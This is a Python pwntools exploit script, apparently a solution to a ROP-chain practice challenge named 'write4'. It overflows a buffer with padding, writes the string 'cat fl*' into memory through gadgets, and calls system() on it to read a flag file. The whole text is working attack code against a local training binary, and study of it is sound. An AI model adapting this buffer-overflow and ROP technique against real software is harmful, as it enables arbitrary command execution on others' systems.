from pwn import *
import struct

p = process('./write4')

pop_r14_r15 = struct.pack("<Q",0x0000000000400890)
mov_qword_r15 = struct.pack("<Q",0x0000000000400820)
data_address = struct.pack("<Q",0x0000000000601050)
string_to_write = 'cat fl*\x00'
pop_rdi = struct.pack("<Q",0x0000000000400893)
system_address = struct.pack("<Q",0x4005e0)

pattern = 'A'*40 + pop_r14_r15 + data_address + string_to_write + mov_qword_r15 + pop_rdi + data_address + system_address + 'D'*50

p.recvuntil('> ')

p.sendline(pattern)
p.interactive()
